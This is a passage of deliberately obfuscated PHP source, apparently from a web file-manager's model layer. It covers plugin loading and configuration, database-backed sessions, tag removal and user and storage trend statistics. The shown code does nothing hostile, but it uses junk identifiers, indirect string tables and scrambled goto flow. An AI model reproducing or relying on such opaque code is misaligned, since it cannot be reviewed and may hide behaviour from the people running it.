$fÂ°„“–Ûí); foreach ($cÂ»µªæ÷ˆ as $C÷³ÌŞ‹×›) { if (!in_array($C÷³ÌŞ‹×›, $c‚·¾Øä‡É)) { $A©Ó‡É§Ò†[] = $C÷³ÌŞ‹×›; } } goto cõì’øÙ•ª; cŠƒ·×ö—: $EËˆ¶‚»“Ë = array(); foreach ($b¦Ôˆ©•Œ„ as $CßÇß©ßÊÆ) { $C÷³ÌŞ‹×› = $CßÇß©ßÊÆ[$f±çßó÷¢œ[85]]; if (!$C÷³ÌŞ‹×›) { continue; } if (!isset($EËˆ¶‚»“Ë[$C÷³ÌŞ‹×›])) { $EËˆ¶‚»“Ë[$C÷³ÌŞ‹×›] = array(); } $EËˆ¶‚»“Ë[$C÷³ÌŞ‹×›][] = $CßÇß©ßÊÆ[$f±çßó÷¢œ[422]]; } $cÂ»µªæ÷ˆ = array(); goto BÓö¬È¥ÈÚ; BÓö¬È¥ÈÚ: foreach ($EËˆ¶‚»“Ë as $Eš¶—ëëÀª => $c‰Û›İÍõ) { $AÙº”êËµí = !0; if (!$B³‡áœÀ¬») { $cÂ»µªæ÷ˆ[] = $Eš¶—ëëÀª; continue; } foreach ($B³‡áœÀ¬» as $Eá¿ÃÉˆ•š) { if (!in_array($Eá¿ÃÉˆ•š, $c‰Û›İÍõ)) { $AÙº”êËµí = !1; break; } } if ($AÙº”êËµí) { $cÂ»µªæ÷ˆ[] = $Eš¶—ëëÀª; } } if (!$cÂ»µªæ÷ˆ) { return array(); } $aòñ¥¼ƒ³ = Model($f±çßó÷¢œ[1180])->listSource(array($f±çßó÷¢œ[413] => array($f±çßó÷¢œ[414], $cÂ»µªæ÷ˆ))); goto BÓùØ„„™Ç; cõì’øÙ•ª: if ($A©Ó‡É§Ò†) { $this->removeBySource($C„ù¿‡ß¾…, $A©Ó‡É§Ò†); } return $aòñ¥¼ƒ³; goto c„ÛÀœŒôƒ; c„ÛÀœŒôƒ: } protected function listData($BİÑ»”‚­…) { $cÑ› ®İ‚ =& $_SERVER[¾÷]; $dóÕì–ĞÅÖ = array($cÑ› ®İ‚[1497] => 0, $cÑ› ®İ‚[466] => array($cÑ› ®İ‚[1775], 0), $cÑ› ®İ‚[418] => $cÑ› ®İ‚[1776] . $BİÑ»”‚­…); $D³Ó”Û­‘¦ = $cÑ› ®İ‚[1777]; $fáŠ× ¾Õğ = $this->field($D³Ó”Û­‘¦)->where($dóÕì–ĞÅÖ)->order($cÑ› ®İ‚[1778])->select(); return $fáŠ× ¾Õğ ? $fáŠ× ¾Õğ : array(); } protected function addToTag($eã™¶°Ó‰•, $a®´”‘‚, $FñæŒ‘Ÿñ£) { $Dµñ±¨®¯á =& $_SERVER[¾÷]; if (!$this->getByTagID($eã™¶°Ó‰•, $FñæŒ‘Ÿñ£) || !$a®´”‘‚) { return !1; } if (!Model($Dµñ±¨®¯á[776])->pathInfo($a®´”‘‚)) { return !1; } $dÜöâê¹” = array($Dµñ±¨®¯á[1497] => 0, $Dµñ±¨®¯á[466] => $FñæŒ‘Ÿñ£, $Dµñ±¨®¯á[417] => $a®´”‘‚, $Dµñ±¨®¯á[418] => $Dµñ±¨®¯á[1779] . $eã™¶°Ó‰•, $Dµñ±¨®¯á[416] => $Dµñ±¨®¯á[43], $Dµñ±¨®¯á[1672] => 0); if ($this->where($dÜöâê¹”)->find()) { return !1; } return $this->add($dÜöâê¹”); } protected function removeFromTag($f¬­Ş±­“Â, $BÀ±ÔâÇôñ, $Eø´‰­÷¡á) { $d’øË«§Åõ =& $_SERVER[¾÷]; if (!$this->getByTagID($f¬­Ş±­“Â, $Eø´‰­÷¡á) || !$BÀ±ÔâÇôñ) { return !1; } if (is_array($BÀ±ÔâÇôñ)) { $BÀ±ÔâÇôñ = array($d’øË«§Åõ[17], $BÀ±ÔâÇôñ); } $aˆä¥ˆêù = array($d’øË«§Åõ[1497] => 0, $d’øË«§Åõ[466] => $Eø´‰­÷¡á, $d’øË«§Åõ[418] => $d’øË«§Åõ[1779] . $f¬­Ş±­“Â, $d’øË«§Åõ[417] => $BÀ±ÔâÇôñ); return $this->where($aˆä¥ˆêù)->delete(); } protected function removeByTag($C¹†Öô†­, $fÚŞÅò‚‹‘) { $b“’ù¼Æ‚¨ =& $_SERVER[¾÷]; if (!$this->getByTagID($C¹†Öô†­, $fÚŞÅò‚‹‘)) { return !1; } $dŠÊº¬Ğ÷Ô = array($b“’ù¼Æ‚¨[1497] => 0, $b“’ù¼Æ‚¨[466] => $fÚŞÅò‚‹‘, $b“’ù¼Æ‚¨[418] => $b“’ù¼Æ‚¨[1779] . $C¹†Öô†­); return $this->where($dŠÊº¬Ğ÷Ô)->delete(); } protected function removeBySource($CÎŒ§ØÒ, $aÍÈÎæµáš) { $a¨¯Â¦Í©ß =& $_SERVER[¾÷]; if (!$CÎŒ§ØÒ || !$aÍÈÎæµáš) { return !1; } if (is_array($aÍÈÎæµáš)) { $aÍÈÎæµáš = array($a¨¯Â¦Í©ß[17], $aÍÈÎæµáš); } $dÎ­ÁèÊ¤ˆ = array($a¨¯Â¦Í©ß[1497] => 0, $a¨¯Â¦Í©ß[417] => $aÍÈÎæµáš, $a¨¯Â¦Í©ß[466] => array($a¨¯Â¦Í©ß[948], 0), $a¨¯Â¦Í©ß[418] => $a¨¯Â¦Í©ß[1779] . $CÎŒ§ØÒ); return $this->where($dÎ­ÁèÊ¤ˆ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\56\x70\x6c\x75\147\x69\156\x4c\x69\x73\x74"; public $field = array("\156\x61\x6d\145", "\163\x74\141\x74\165\163", "\x72\145\x67\x69\145\x73\x74", "\143\x6f\156\146\x69\x67"); public function loadList($fŒåŒõåŠ¨ = false) { $a”Óê£Ë£Ü = array_to_keyvalue($this->listData(), $_SERVER[¾÷][38]); if ($fŒåŒõåŠ¨) { return $a”Óê£Ë£Ü[$fŒåŒõåŠ¨]; } return $a”Óê£Ë£Ü; } public function init() { $bŠí’ä»Œ =& $_SERVER[¾÷]; Hook::trigger($bŠí’ä»Œ[1780]); $C¾Ì°¤Ğ„ö = $this->loadPluginList(); foreach ($C¾Ì°¤Ğ„ö as $d¶±¡‹é¼› => $FŒ¶¨à„´é) { $Cåâ¼Ú¶ÄÜ = $this->appAllow($d¶±¡‹é¼›, $FŒ¶¨à„´é); if (!$Cåâ¼Ú¶ÄÜ) { continue; } foreach ($FŒ¶¨à„´é[$bŠí’ä»Œ[1781]] as $BİÑŠ•Ş¶ => $C¯Ô¬¾ Ö) { Hook::bind($BİÑŠ•Ş¶, $C¯Ô¬¾ Ö); } } Hook::trigger($bŠí’ä»Œ[1782]); Hook::trigger(ACTION); } public function appAllow($B·ÇÉ‚¿±¹, $e„ŒÆƒà¶—, $AÒ¡´£ìÍ¾ = true) { $cğ‹¼²äƒø =& $_SERVER[¾÷]; $d·°¢´¿× = PLUGIN_DIR . $B·ÇÉ‚¿±¹ . $cğ‹¼²äƒø[1783]; if (!is_array($e„ŒÆƒà¶—) || !is_array($e„ŒÆƒà¶—[$cğ‹¼²äƒø[1781]]) || $e„ŒÆƒà¶—[$cğ‹¼²äƒø[711]] != 1 || !is_file($d·°¢´¿×)) { return !1; } if ($GLOBALS[$cğ‹¼²äƒø[488]] == 1) { return !0; } if ($AÒ¡´£ìÍ¾ && !Action($cğ‹¼²äƒø[1784])->checkAuth($B·ÇÉ‚¿±¹)) { return !1; } return !0; } public function unInstall($Bƒ”Œ‰Ô»±) { $dµíÕÃïâ =& $_SERVER[¾÷]; $BÇ‚Á˜Å”¾ = $this->loadList($Bƒ”Œ‰Ô»±); if (file_exists(PLUGIN_DIR . $Bƒ”Œ‰Ô»±)) { Hook::apply($Bƒ”Œ‰Ô»± . $dµíÕÃïâ[1785]); } $this->remove($BÇ‚Á˜Å”¾[$dµíÕÃïâ[397]]); } public function changeStatus($eÏƒøäÔãñ, $a„³ÔŠÀ×Ğ) { $AâÉó»¿ =& $_SERVER[¾÷]; $dáŠÊ•Õ¾ = $this->loadList($eÏƒøäÔãñ); if ($a„³ÔŠÀ×Ğ) { Hook::apply($eÏƒøäÔãñ . $AâÉó»¿[1786]); } $this->update($dáŠÊ•Õ¾[$AâÉó»¿[397]], array($AâÉó»¿[1787] => $a„³ÔŠÀ×Ğ)); } public function appRegist($a•Ş£Šˆ×¿, $c¯ëĞãçëî) { $eİÇˆÁ÷ =& $_SERVER[¾÷]; $D´‡‹©˜½Ë = $this->loadList($a•Ş£Šˆ×¿); if ($D´‡‹©˜½Ë) { $this->update($D´‡‹©˜½Ë[$eİÇˆÁ÷[397]], array($eİÇˆÁ÷[1781] => $c¯ëĞãçëî)); } else { $E­±‘§Ñ™à = array($eİÇˆÁ÷[38] => $a•Ş£Šˆ×¿, $eİÇˆÁ÷[1781] => $c¯ëĞãçëî, $eİÇˆÁ÷[711] => 0, $eİÇˆÁ÷[16] => $this->getConfigDefault($a•Ş£Šˆ×¿)); $this->insert($E­±‘§Ñ™à); } } public function getConfigDefault($C¡éˆ½ÂÙ) { $BŞÀÁÏÚÑ =& $_SERVER[¾÷]; $C¹¯÷Åå¤ã = array(); $d¸àÓ÷½Ÿ = $this->getPackageJson($C¡éˆ½ÂÙ); if (!$d¸àÓ÷½Ÿ && is_array($d¸àÓ÷½Ÿ[$BŞÀÁÏÚÑ[1788]])) { return $C¹¯÷Åå¤ã; } foreach ($d¸àÓ÷½Ÿ[$BŞÀÁÏÚÑ[1788]] as $ešÑÙÙÑŞ => $b¸—˜İô½Æ) { if (!isset($b¸—˜İô½Æ[$BŞÀÁÏÚÑ[379]]) || isset($C¹¯÷Åå¤ã[$ešÑÙÙÑŞ])) { continue; } $C¹¯÷Åå¤ã[$ešÑÙÙÑŞ] = $b¸—˜İô½Æ[$BŞÀÁÏÚÑ[379]]; } return $C¹¯÷Åå¤ã; } public function getPackageJson($fööÔ½Ÿ¿¿) { return Hook::apply($fööÔ½Ÿ¿¿ . $_SERVER[¾÷][1789]); } public function getConfig($f²ğ›Ğ¨º, $CŠ§‡ÂÉôù = false) { $dªäĞƒÔåù =& $_SERVER[¾÷]; $Fø÷Àäì±” = array(); $Eî¢¦ĞˆÛ = $this->loadList($f²ğ›Ğ¨º); if ($Eî¢¦ĞˆÛ && is_array($Eî¢¦ĞˆÛ[$dªäĞƒÔåù[16]])) { $Fø÷Àäì±” = $Eî¢¦ĞˆÛ[$dªäĞƒÔåù[16]]; } if (!$Fø÷Àäì±” || $CŠ§‡ÂÉôù) { $Fø÷Àäì±” = $this->getConfigDefault($f²ğ›Ğ¨º); } return $Fø÷Àäì±”; } public function setConfig($eøñŞŒÑ ğ, $b”éÃ„òø = false) { goto DŒË¢ò¨‘Š; f·ù²¯†âÅ: $this->update($AˆÇµ‰™Êº[$F÷Ô½øè»[397]], array($F÷Ô½øè»[16] => $F¹¶øœê ä)); goto EÔÓÕˆêÄ–; DŒË¢ò¨‘Š: $F÷Ô½øè» =& $_SERVER[¾÷]; $AˆÇµ‰™Êº = $this->loadList($eøñŞŒÑ ğ); if (!$AˆÇµ‰™Êº) { return !1; } goto d­Œ‘‘’á¿; d­Œ‘‘’á¿: $F¹¶øœê ä = $AˆÇµ‰™Êº[$F÷Ô½øè»[16]]; if ($b”éÃ„òø == !1) { $F¹¶øœê ä = array(); $b”éÃ„òø = $this->getConfigDefault($eøñŞŒÑ ğ); } foreach ($b”éÃ„òø as $AÕæ¼ĞÙ›Ğ => $a‹ĞŞŠÍèô) { $F¹¶øœê ä[$AÕæ¼ĞÙ›Ğ] = is_string($a‹ĞŞŠÍèô) ? trim($a‹ĞŞŠÍèô) : $a‹ĞŞŠÍèô; } goto f·ù²¯†âÅ; EÔÓÕˆêÄ–: } public function viewList() { goto a‡Â…Á…×Å; a‡Â…Á…×Å: $aíŒ°š• =& $_SERVER[¾÷]; $c‰ôÏã²ø¾ = $this->loadList(); $this->pluginScan($c‰ôÏã²ø¾); goto C­ñ¼ÜÒÒ; C­ñ¼ÜÒÒ: $c‰ôÏã²ø¾ = $this->loadPluginList(); $A‹‹¾¦ùŠ = array(); foreach ($c‰ôÏã²ø¾ as $FöÕæ”Ğò => $Få²õ‚ºè¸) { unset($Få²õ‚ºè¸[$aíŒ°š•[1781]], $Få²õ‚ºè¸[$aíŒ°š•[16]]); $aÌÊÚÜŒî± = PLUGIN_DIR . $Få²õ‚ºè¸[$aíŒ°š•[38]] . $aíŒ°š•[1783]; if (!is_file($aÌÊÚÜŒî±)) { continue; } $aâ«Í¶‘† = Hook::apply($Få²õ‚ºè¸[$aíŒ°š•[38]] . $aíŒ°š•[1789]); if (is_array($aâ«Í¶‘†)) { $A‹‹¾¦ùŠ[$FöÕæ”Ğò] = array_merge($Få²õ‚ºè¸, $aâ«Í¶‘†); } } goto a°¨×õÑ°; a°¨×õÑ°: return $A‹‹¾¦ùŠ; goto eŞ¤¦‘Ğ‘; eŞ¤¦‘Ğ‘: } private function loadPluginList() { $Aºä“ˆ°â¾ =& $_SERVER[¾÷]; $E‡†Ã‹ƒ = $this->loadList(); if (strtolower(MOD) == $Aºä“ˆ°â¾[1790]) { return $E‡†Ã‹ƒ; } $d£ª©”†… = Hook::trigger($Aºä“ˆ°â¾[1791], $E‡†Ã‹ƒ); if ($E‡†Ã‹ƒ && !$d£ª©”†…) { die; } return $d£ª©”†… ? $d£ª©”†… : $E‡†Ã‹ƒ; } private function pluginScan($aæ¾”—Š¥) { $aËŸìÎåÅ‘ =& $_SERVER[¾÷]; recursion_dir(PLUGIN_DIR, $FŒ„íšŒ¬, $F¯òÀ“õ‰, 0); foreach ($FŒ„íšŒ¬ as $DÎŞ˜õÓœÎ) { $AÜÇĞ§®Ïˆ = get_path_this($DÎŞ˜õÓœÎ); if (isset($aæ¾”—Š¥[$AÜÇĞ§®Ïˆ]) || !file_exists($DÎŞ˜õÓœÎ . $aËŸìÎåÅ‘[1792]) || !file_exists($DÎŞ˜õÓœÎ . $aËŸìÎåÅ‘[1783])) { continue; } Hook::apply($AÜÇĞ§®Ïˆ . $aËŸìÎåÅ‘[1786]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\163\164\x65\x6d\x5f\163\x65\163\163\x69\157\x6e"; public function get($fô¹çÇÂ…ø) { $D§ë»¾Šì =& $_SERVER[¾÷]; $bõ¦œ´¿ = $this->where(array($D§ë»¾Šì[1793] => $fô¹çÇÂ…ø))->find(); if (!is_array($bõ¦œ´¿)) { return !1; } return $bõ¦œ´¿[$D§ë»¾Šì[714]]; } public function set($AÅ¢’“–šÓ, $AÒôï›º½Î, $B««ŒÔÈÜœ = 3600) { $fÑôé¸ºĞ =& $_SERVER[¾÷]; $CÆ¥ó’Åé÷ = array($fÑôé¸ºĞ[1793] => $AÅ¢’“–šÓ, $fÑôé¸ºĞ[1701] => $AÒôï›º½Î, $fÑôé¸ºĞ[1794] => $B««ŒÔÈÜœ + time()); if (Session::get($fÑôé¸ºĞ[1795])) { $CÆ¥ó’Åé÷[$fÑôé¸ºĞ[1505]] = Session::get($fÑôé¸ºĞ[1795]); } else { $CÆ¥ó’Åé÷[$fÑôé¸ºĞ[1505]] = 0; } if ($this->get($AÅ¢’“–šÓ)) { return $this->where(array($fÑôé¸ºĞ[1793] => $AÅ¢’“–šÓ))->save($CÆ¥ó’Åé÷); } else { return $this->add($CÆ¥ó’Åé÷, array(), !0); } } public function remove($bæó­âñ¬×) { return $this->where(array($_SERVER[¾÷][1793] => $bæó­âñ¬×))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¾÷][1796] . time())->delete(); } } goto cœƒ¢Æ—¹; b›òËŠÒï: define($_SERVER[¾÷][576], $_SERVER[¾÷][577]); $Dˆ’™ò©ëã = $_SERVER[¾÷][578]; if (!$Dˆ’™ò©ëã) { return; } goto CÃœäó”Œ‘; aƒŒ‚’ôĞÖ: class AnalysisModel extends ModelBaseLight { public function init($C‘Ï×æ—â) { $C‚õùî¨ØÎ =& $_SERVER[¾÷]; $aÃğ…¬Ğ¦ = array($C‚õùî¨ØÎ[566] => array($C‚õùî¨ØÎ[39] => $C‚õùî¨ØÎ[1594], $C‚õùî¨ØÎ[278] => array($C‚õùî¨ØÎ[230], $C‚õùî¨ØÎ[722], $C‚õùî¨ØÎ[1595], $C‚õùî¨ØÎ[1596])), $C‚õùî¨ØÎ[1597] => array($C‚õùî¨ØÎ[39] => $C‚õùî¨ØÎ[1598], $C‚õùî¨ØÎ[278] => array($C‚õùî¨ØÎ[230], $C‚õùî¨ØÎ[720], $C‚õùî¨ØÎ[1599], $C‚õùî¨ØÎ[1600], $C‚õùî¨ØÎ[1601]))); if (!isset($aÃğ…¬Ğ¦[$C‘Ï×æ—â])) { return !1; } $this->optionType = $aÃğ…¬Ğ¦[$C‘Ï×æ—â][$C‚õùî¨ØÎ[39]]; $this->field = $aÃğ…¬Ğ¦[$C‘Ï×æ—â][$C‚õùî¨ØÎ[278]]; return !0; } public function listData($cˆÆĞœ†¢ = false, $bÍÍëé–î‚ = "\x6d\x6f\144\x69\x66\171\124\x69\x6d\x65", $d„Ã¿Ò¨©³ = false) { return parent::listData($cˆÆĞœ†¢, $bÍÍëé–î‚, $d„Ã¿Ò¨©³); } public function trendList($a¯‘é˜‘ã¦) { goto cÖä¬ÚÑ¥Ì; Câ„ñó: if (!isset($f‡Ãô½Ï‘¬)) { $A¬îéå¡Ä« = $a¯‘é˜‘ã¦ == $d‘…’Ë¹ä–[566] ? $d‘…’Ë¹ä–[510] : $d‘…’Ë¹ä–[776]; $f‡Ãô½Ï‘¬ = Model($A¬îéå¡Ä«)->min($d‘…’Ë¹ä–[202]); } $C£Š¦† = $d‘…’Ë¹ä–[1604] . ucfirst($a¯‘é˜‘ã¦); $DÍˆ†§Å•‚ = $this->dateList($f‡Ãô½Ï‘¬); goto c³ëÇï›·¨; c³ëÇï›·¨: foreach ($DÍˆ†§Å•‚ as $A³ñ¨µˆ) { $this->{$C£Š¦†}($A³ñ¨µˆ); } return $this->listData(); goto d¡¥ãŸ©î©; cÖä¬ÚÑ¥Ì: $d‘…’Ë¹ä– =& $_SERVER[¾÷]; $FÁÓ¡ë³˜ƒ = $this->listData(); if ($FÁÓ¡ë³˜ƒ) { $d•Ò¯Û¹§Ò = end($FÁÓ¡ë³˜ƒ); $A³ñ¨µˆ = date($d‘…’Ë¹ä–[1602], strtotime($d‘…’Ë¹ä–[1603])); if ($d•Ò¯Û¹§Ò[$d‘…’Ë¹ä–[230]] == $A³ñ¨µˆ) { return $FÁÓ¡ë³˜ƒ; } $f‡Ãô½Ï‘¬ = strtotime($d•Ò¯Û¹§Ò[$d‘…’Ë¹ä–[230]]); } goto Câ„ñó; d¡¥ãŸ©î©: } private function dateList($Bã­¶‰¸—ï) { $Aãí•Ë† =& $_SERVER[¾÷]; $bêå±Òàéì = $Bã­¶‰¸—ï; $CİàÃÜĞÜ = strtotime($Aãí•Ë†[1603]); $Bãš·‰„ô® = array(); while ($bêå±Òàéì <= $CİàÃÜĞÜ) { $Bãš·‰„ô®[] = date($Aãí•Ë†[1602], $bêå±Òàéì); $bêå±Òàéì = strtotime($Aãí•Ë†[1605], $bêå±Òàéì); } return $Bãš·‰„ô®; } public function _recordUser($c¼£ç‘¯÷ä = '') { goto B¹ï÷ìàì³; Aéì×±Œ©: $a—í‘‰‹öÇ = Model($aÔõäø‡Ï[510])->where($bìÔ²ëæ˜)->count($aÔõäø‡Ï[1505]); $bìÔ²ëæ˜[$aÔõäø‡Ï[39]] = $aÔõäø‡Ï[1608]; $dÇÔº”ªİÔ = Model($aÔõäø‡Ï[1609])->where($bìÔ²ëæ˜)->count($aÔõäø‡Ï[1610]); goto AöÓÆ¡Å; CÈµ•´ƒ: $bìÔ²ëæ˜ = array($aÔõäø‡Ï[202] => array($aÔõäø‡Ï[947], $D÷§Ÿ¼’ƒ)); $f°–Î‡Ê›» = Model($aÔõäø‡Ï[510])->where($bìÔ²ëæ˜)->count($aÔõäø‡Ï[1505]); $bìÔ²ëæ˜[$aÔõäø‡Ï[202]] = array($aÔõäø‡Ï[338], array($Dí¼¹ƒŒ›‘, $D÷§Ÿ¼’ƒ)); goto Aéì×±Œ©; AöÓÆ¡Å: $dÚœì²¬¨Ä = array($aÔõäø‡Ï[230] => $c¼£ç‘¯÷ä, $aÔõäø‡Ï[722] => (int) $f°–Î‡Ê›», $aÔõäø‡Ï[1595] => (int) $a—í‘‰‹öÇ, $aÔõäø‡Ï[1596] => (int) $dÇÔº”ªİÔ); return $this->insert($dÚœì²¬¨Ä); goto F¥ ·¡ô¹; B¹ï÷ìàì³: $aÔõäø‡Ï =& $_SERVER[¾÷]; $Dí¼¹ƒŒ›‘ = strtotime(date($aÔõäø‡Ï[1606], strtotime($c¼£ç‘¯÷ä))); $D÷§Ÿ¼’ƒ = strtotime(date($aÔõäø‡Ï[1607], strtotime($c¼£ç‘¯÷ä))); goto CÈµ•´ƒ; F¥ ·¡ô¹: } public function _recordStore($dµí…®Øö = '') { goto Aß‹µ®´Éº; c¿Ö”¯¯Ñ: $d¨¯‰Šª– = Model($DÂºô±¡„Ú[453])->where($Aò»ƒí¸¶)->sum($DÂºô±¡„Ú[87]); $Aò»ƒí¸¶[$DÂºô±¡„Ú[406]] = 0; $eÎŠËÄéÈ™ = Model($DÂºô±¡„Ú[776])->where($Aò»ƒí¸¶)->sum($DÂºô±¡„Ú[87]); goto Dö‘äáÇ”; FÌë–Šïëé: $Dóâçã’ = Model($DÂºô±¡„Ú[776])->where($Aò»ƒí¸¶)->sum($DÂºô±¡„Ú[87]); $Aê¯À« = array($DÂºô±¡„Ú[230] => $dµí…®Øö, $DÂºô±¡„Ú[720] => (int) $eÎŠËÄéÈ™, $DÂºô±¡„Ú[1599] => (int) $d¨¯‰Šª–, $DÂºô±¡„Ú[1600] => (int) $a†¼ºÚÖ , $DÂºô±¡„Ú[1601] => (int) $Dóâçã’); return $this->insert($Aê¯À«); goto A«¿†­¼ˆÆ; Aß‹µ®´Éº: $DÂºô±¡„Ú =& $_SERVER[¾÷]; $EªàÂÛöáÄ = strtotime(date($DÂºô±¡„Ú[1607], strtotime($dµí…®Øö))); $Aò»ƒí¸¶ = array($DÂºô±¡„Ú[202] => array($DÂºô±¡„Ú[947], $EªàÂÛöáÄ)); goto c¿Ö”¯¯Ñ; Dö‘äáÇ”: $Aò»ƒí¸¶[$DÂºô±¡„Ú[407]] = 1; $a†¼ºÚÖ  = Model($DÂºô±¡„Ú[776])->where($Aò»ƒí¸¶)->sum($DÂºô±¡„Ú[87]); $Aò»ƒí¸¶[$DÂºô±¡„Ú[407]] = 2; goto FÌë–Šïëé; A«¿†­¼ˆÆ: } public function trend($Fí‰¼Æ­Ì©, $E†ááÆ…é ) { goto eÒ´Îç‚; EßâÇÍ©ê…: return $eéãÑ…Œ; goto CñÊà˜ª; eÒ´Îç‚: $A”Ø“í»³õ =& $_SERVER[¾÷]; if (!$this->init($Fí‰¼Æ­Ì©)) { return !1; } $Bœ›»‡Æ‘ = $this->trendList($Fí‰¼Æ­Ì©); goto c“Ïùö¢‡©; A¾÷Ò›¸¬ø: if (empty($Bœ›»‡Æ‘)) { $FÙ´Ç…ğÒ = date($A”Ø“í»³õ[1602], strtotime($A”Ø“í»³õ[1603])); $bæŠÄòìñ = array($A”Ø“í»³õ[230] => $FÙ´Ç…ğÒ); foreach ($Aö‡à¶Ù[$Fí‰¼Æ­Ì©] as $fëõœÙŠÀ => $A‰À¿Ÿ¶î¯) { $bæŠÄòìñ[$fëõœÙŠÀ] = 0; } $Bœ›»‡Æ‘[] = $bæŠÄòìñ; } $eéãÑ…Œ = array(); foreach ($Bœ›»‡Æ‘ as $A‰À¿Ÿ¶î¯) { if ($Fí‰¼Æ­Ì© == $A”Ø“í»³õ[1597] && $A‰À¿Ÿ¶î¯[$A”Ø“í»³õ[1599]] > $A‰À¿Ÿ¶î¯[$A”Ø“í»³õ[720]]) { $A‰À¿Ÿ¶î¯[$A”Ø“í»³õ[1599]] = $A‰À¿Ÿ¶î¯[$A”Ø“í»³õ[720]]; } foreach ($Aö‡à¶Ù[$Fí‰¼Æ­Ì©] as $fëõœÙŠÀ => $a¿ ¿ëÏ ) { $b­‡ãï¤×Ê = array($A”Ø“í»³õ[230] => $A‰À¿Ÿ¶î¯[$A”Ø“í»³õ[230]], $A”Ø“í»³õ[1410] => $a¿ ¿ëÏ ); $b­‡ãï¤×Ê[$f¨Œ©ÜĞ’Ò[$Fí‰¼Æ­Ì©]] = isset($A‰À¿Ÿ¶î¯[$fëõœÙŠÀ]) ? $A‰À¿Ÿ¶î¯[$fëõœÙŠÀ] : 0; $eéãÑ…Œ[] = $b­‡ãï¤×Ê; } } goto EßâÇÍ©ê…; c“Ïùö¢‡©: if ($Bœ›»‡Æ‘ && $E†ááÆ…é  != $A”Ø“í»³õ[1479]) { $f¬»ó—™é = $Bœ›»‡Æ‘[0][$A”Ø“í»³õ[230]]; $cŠñ±©ÍŞ‹ = $this->validDate($E†ááÆ…é , $f¬»ó—™é); $f™ ÎõëˆĞ = array(); $fóª×—öÀ¶ = array_to_keyvalue($Bœ›»‡Æ‘, $A”Ø“í»³õ[230]); foreach ($cŠñ±©ÍŞ‹ as $FÙ´Ç…ğÒ) { if (isset($fóª×—öÀ¶[$FÙ´Ç…ğÒ])) { $b­‡ãï¤×Ê = $fóª×—öÀ¶[$FÙ´Ç…ğÒ]; } else { $b­‡ãï¤×Ê = end($Bœ›»‡Æ‘); $b­‡ãï¤×Ê[$A”Ø“í»³õ[230]] = $FÙ´Ç…ğÒ; if ($Fí‰¼Æ­Ì© == $A”Ø“í»³õ[566]) { $b­‡ãï¤×Ê[$A”Ø“í»³õ[1595]] = $b­‡ãï¤×Ê[$A”Ø“í»³õ[1596]] = 0; } } $f™ ÎõëˆĞ[] = $b­‡ãï¤×Ê; } $Bœ›»‡Æ‘ = $f™ ÎõëˆĞ; } $Aö‡à¶Ù = array($A”Ø“í»³õ[566] => array($A”Ø“í»³õ[722] => LNG($A”Ø“í»³õ[1611]), $A”Ø“í»³õ[1595] => LNG($A”Ø“í»³õ[1612]), $A”Ø“í»³õ[1596] => LNG($A”Ø“í»³õ[1613])), $A”Ø“í»³õ[1597] => array($A”Ø“í»³õ[720] => LNG($A”Ø“í»³õ[1614]), $A”Ø“í»³õ[1599] => LNG($A”Ø“í»³õ[1615]), $A”Ø“í»³õ[1600] => LNG($A”Ø“í»³õ[1616]), $A”Ø“í»³õ[1601] => LNG($A”Ø“í»³õ[1617]))); $f¨Œ©ÜĞ’Ò = array($A”Ø“í»³õ[566] => $A”Ø“í»³õ[1618], $A”Ø“í»³õ[1597] => $A”Ø“í»³õ[87]); goto A¾÷Ò›¸¬ø; CñÊà˜ª: } public function validDate($aöô‡ÔÚ‡…, $FñÌ‰µ‰ˆà) { goto Eõ”à‡”ÇÕ; B‰‹‘Äî»Æ: switch ($aöô‡ÔÚ‡…) { case $A¤Ãô’Œ´Ã[1486]: $eÁ‚Óø§à = mktime(0, 0, 0, date($A¤Ãô’Œ´Ã[1619]), date($A¤Ãô’Œ´Ã[1228]) - date($A¤Ãô’Œ´Ã[1290]) + 7 - 7, date($A¤Ãô’Œ´Ã[1620])); $f«Ø ˜êó” = 0; do { $fï‰É×ñ»Ÿ = date($A¤Ãô’Œ´Ã[1602], $eÁ‚Óø§à - 3600 * 24 * 7 * $f«Ø ˜êó”); $FÕ‘ßÈº[] = $fï‰É×ñ»Ÿ; $f«Ø ˜êó”++; } while ($FñÌ‰µ‰ˆà < $fï‰É×ñ»Ÿ); break; case $A¤Ãô’Œ´Ã[1484]: $f«Ø ˜êó” = 1; do { $F¥å°…¾çÃ = date($A¤Ãô’Œ´Ã[1621], strtotime("\55\x20{$f«Ø ˜êó”}\40\x6d\157\x6e\x74\150\x73")); $FÕ‘ßÈº[] = $F¥å°…¾çÃ; $f«Ø ˜êó”++; } while ($FñÌ‰µ‰ˆà < $F¥å°…¾çÃ); break; case $A¤Ãô’Œ´Ã[1622]: $F‚¦‚²Ç¢™ = (int) date($A¤Ãô’Œ´Ã[1620], strtotime($FñÌ‰µ‰ˆà)); $bğéÄÃÎÏê = (int) date($A¤Ãô’Œ´Ã[1620]); if ($F‚¦‚²Ç¢™ >= $bğéÄÃÎÏê) { break; } for ($F‚¦‚²Ç¢™; $F‚¦‚²Ç¢™ < $bğéÄÃÎÏê; $F‚¦‚²Ç¢™++) { $FÕ‘ßÈº[] = $F‚¦‚²Ç¢™ . $A¤Ãô’Œ´Ã[1623]; } break; default: break; } if ($FñÌ‰µ‰ˆà > end($FÕ‘ßÈº)) { array_pop($FÕ‘ßÈº); } sort($FÕ‘ßÈº); goto Aìœ¾ò££; Eõ”à‡”ÇÕ: $A¤Ãô’Œ´Ã =& $_SERVER[¾÷]; $DÆª›Âƒ¨† = date($A¤Ãô’Œ´Ã[1602], strtotime($A¤Ãô’Œ´Ã[1603])); $FÕ‘ßÈº = array($DÆª›Âƒ¨†); goto B‰‹‘Äî»Æ; Aìœ¾ò££: return $FÕ‘ßÈº; goto fäò‡Úßğ¨; fäò‡Úßğ¨: } public function listTable($C¬±Æ›Úğî) { $bøÖÓ‡”Âè = ucfirst($C¬±Æ›Úğî); return Model($bøÖÓ‡”Âè)->listData(); } public function option($a™ÆÒÀŞÀ) { $aãØøÎÏÅ = $_SERVER[¾÷][1624] . ucfirst($a™ÆÒÀŞÀ); return $this->{$aãØøÎÏÅ}(); } private function optionUser() { goto c¡½óµñº©; FÂ¥šäÇï©: return array($Bµã•çÙÜ‚[717] => (int) $AÍµ–’Şåğ, $Bµã•çÙÜ‚[1627] => (int) ($AÍµ–’Şåğ - $B ‚İ÷çöà), $Bµã•çÙÜ‚[1628] => (int) $B 